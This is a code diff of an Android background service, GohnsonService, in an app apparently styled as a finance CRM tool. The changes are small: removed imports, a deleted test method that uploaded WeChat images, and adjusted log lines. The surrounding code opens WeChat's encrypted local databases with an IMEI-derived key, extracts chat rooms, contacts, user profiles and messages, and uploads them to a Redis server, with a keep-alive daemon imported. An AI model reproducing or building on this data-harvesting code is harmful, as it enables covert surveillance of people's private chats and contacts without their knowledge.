@@ -1,37 +1,24 @@
 package com.crm.finance;
 
-import android.app.AlarmManager;
 import android.app.Notification;
-import android.app.PendingIntent;
 import android.app.Service;
-import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.IBinder;
-import android.os.PowerManager;
-import android.preference.PreferenceManager;
-import android.provider.Settings;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
-import com.crm.finance.broadcast.BroadcastManager;
 import com.crm.finance.broadcast.BroadcastUtils;
 import com.crm.finance.dao.DevInfoDao;
-import com.crm.finance.dao.HeartCofigDao;
 import com.crm.finance.dao.ImgFlagDao;
 import com.crm.finance.dao.MessageDao;
 import com.crm.finance.dao.RcontactDao;
 import com.crm.finance.dao.UserInfoDao;
 import com.crm.finance.util.Common;
-import com.crm.finance.util.FTPUtils;
 import com.crm.finance.util.GlobalCofig;
 import com.crm.finance.util.JedisUtil;
 import com.crm.finance.util.LogInputUtil;
 import com.crm.finance.util.MyLog;
-import com.crm.finance.util.OkHttpUtil;
 import com.crm.finance.util.ShareData;
 import com.crm.finance.util.UploadManager;
 import com.crm.finance.util.Utils;
@@ -41,8 +28,6 @@ import com.crm.finance.util.wxutil.WXFileUtil;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 import com.marswin89.marsdaemon.MyApplication1;
-import com.marswin89.marsdaemon.Service1;
-import com.tencent.bugly.Bugly;
 import com.tencent.bugly.crashreport.CrashReport;
 
 import net.sqlcipher.database.SQLiteDatabase;
@@ -55,23 +40,14 @@ import org.w3c.dom.NodeList;
 
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
 import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
 import java.util.Timer;
 import java.util.TimerTask;
 
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
 
-import okhttp3.Call;
-import okhttp3.Callback;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
 import redis.clients.jedis.Jedis;
 
 
@@ -94,22 +70,7 @@ public class GohnsonService extends Service {
         super.onCreate();
         initBaseContnet();
     }
-    public void testUploadImg(){
-        long sumFileSize = 0;
-        long currentTime = System.currentTimeMillis();
 
-        for (int i = 0; i < 20; i++) {
-            MessageDao dao = new MessageDao();
-            //String imgPath = "fdfc63658ec94cd3845d2d5d9627c076/image2/57/d9/57d9f13a5ea86ade439b965e3a117de5.jpg";
-            String imgPath = "fdfc63658ec94cd3845d2d5d9627c076/image2/a4/be/th_a4beb600dcf1d8584c944af839f10f4ehd";
-            WXFileUtil.uploadWXImage(dao, imgPath,i);
-            sumFileSize = sumFileSize + dao.getFileSize();
-        }
-
-        long lastTime = System.currentTimeMillis();
-        long intervalTime = (lastTime - currentTime)/1000;
-        MyLog.inputLogToFile(TAG,"本次上传文件总大小 "+sumFileSize+" KB,耗时 "+intervalTime +" 秒");
-    }
 
     public void initBaseContnet(){
         LogInputUtil.e(TAG, "GohnsonService 启动 onCreate");
@@ -229,7 +190,7 @@ public class GohnsonService extends Service {
             wxIMEI1 = Common.getWxIMEI(tencent1CompatibleInfoPath);
         else
             wxIMEI1 = strIMEI;
-        MyLog.inputLogToFile(TAG, "deviceId = "+strIMEI+",wxIMEI = " + wxIMEI+",wxIMEI1="+wxIMEI1);
+        MyLog.inputLogToFile(TAG, "deviceId = "+strIMEI+" ,wxIMEI = " + wxIMEI+" ,wxIMEI1="+wxIMEI1+" ,appVersion = "+Utils.getVersionNumber(this));
 
      /*   String parallelLiteCompatibleInfoPath =GlobalCofig.OPERATION_DIR_PARALLEL_LITE + GlobalCofig.COMPATIBLE_INFO_CFG;
         if (new File(parallelLiteCompatibleInfoPath).exists())
@@ -359,6 +320,7 @@ public class GohnsonService extends Service {
                             dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
                             uploadOperation(dataTarget, f, pathUin, wxIMEI, fileChangeTime);
                         } catch (Exception e) {
+
                             String exceptionStr = "异常 ：上传数据信息失败:" + e.getLocalizedMessage() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
                             MyLog.inputLogToFile(TAG, exceptionStr);
                             BroadcastUtils.sendDataUploadErrLog(exceptionStr);
@@ -404,6 +366,7 @@ public class GohnsonService extends Service {
 
         final ArrayList<Object> chatRooms = WXDataFormJsonUtil.getChatRoomDataInDB(dataTarget);
         String chatRoomJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, chatRooms, pathUin, deviceID, userName);
+
         LogInputUtil.e(TAG, "待提交的chatRoomJsonStr = " + chatRoomJsonStr);
         boolean chatroomUploadSucceed = false;
         if (chatRoomJsonStr != null && !chatRoomJsonStr.equals("")) {
@@ -438,6 +401,7 @@ public class GohnsonService extends Service {
         }
 
         String rcontactJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, rcontacts, pathUin, deviceID, userName);
+
         LogInputUtil.e(TAG, "待提交的rcontactJsonStr = " + rcontactJsonStr);
         boolean rcontactUploadSucceed = false;
         if (rcontactJsonStr != null && !rcontactJsonStr.equals("")) {
@@ -446,6 +410,7 @@ public class GohnsonService extends Service {
 
 
         String userInfoJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, userInfos, pathUin, deviceID, userName);
+
         LogInputUtil.e(TAG, "待提交的userInfoJsonStr = " + userInfoJsonStr);
         boolean userInfoUploadSucceed = false;
         if (userInfoJsonStr != null && !userInfoJsonStr.equals("")) {
@@ -473,6 +438,7 @@ public class GohnsonService extends Service {
             int listSize = messages.size();
             if (listSize > 0) {
                 String messageJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, messages, pathUin, deviceID, userName);
+
                 LogInputUtil.e(TAG, "待提交的MessageJson = " + messageJsonStr);
                 if (messageJsonStr != null && !messageJsonStr.equals("")) {
                     dataUploadSucceed = uploadMessageDataToRedis(GlobalCofig.REDIS_KEY_MESSAGE, messageJsonStr, file);
@@ -587,7 +553,7 @@ public class GohnsonService extends Service {
             BroadcastUtils.sendDataUploadLog(lastUploadTimeTemporary,file.getPath());
             return true;
         } catch (Exception e) {
-            String errMsg = key + ":redis 连接失败, errMsg = " + e.getLocalizedMessage();
+            String errMsg = key + ":redis 连接失败, errMsg = " + e.getMessage();
             MyLog.inputLogToFile(TAG, errMsg);
             BroadcastUtils.sendDataUploadErrLog(errMsg);
             return false;
